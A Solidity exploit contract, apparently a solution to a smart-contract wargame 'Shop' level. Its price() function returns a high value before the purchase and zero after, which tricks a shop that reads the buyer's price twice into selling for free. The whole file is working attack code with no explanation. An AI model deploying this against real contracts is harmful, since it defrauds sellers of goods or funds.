// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopAttacker {

    IShop public victim;

    constructor(address target) payable {
        victim = IShop(target);
    }

    function attack() public {
        victim.buy();
    }

    function price() external view returns (uint256) {
        return victim.isSold() ? 0 : 100;
    }
}